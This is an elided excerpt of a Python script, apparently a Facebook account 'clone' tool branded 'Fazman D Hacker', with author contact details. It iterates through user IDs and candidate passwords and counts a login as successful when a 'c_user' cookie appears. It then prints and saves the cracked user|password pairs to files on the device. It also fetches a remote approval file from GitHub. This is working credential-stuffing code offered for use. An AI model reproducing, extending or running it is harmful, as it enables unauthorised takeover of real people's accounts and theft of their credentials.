...
def main_apv():
    ...
    r1=requests.get("https://github.com/Fazmoney/FazFast/blob/main/z.txt").text
...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Author   : Fazman D Hacker

    GitHub : Fasman

    Connect  : +2347047848559
...
def R():
			...
			print ("\033[1m [!] Tool    : Fazman Ok ID's Fast Clone")

			print (" [!] Brand   : Fazman Ok Clone")
			...
			print(" [2] Create Super File [ Fazman ]")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[Fazman TM]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Successful Fazman-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Fazman_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Fazman_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      Fazman D HACKER😊 \033[1;37m")
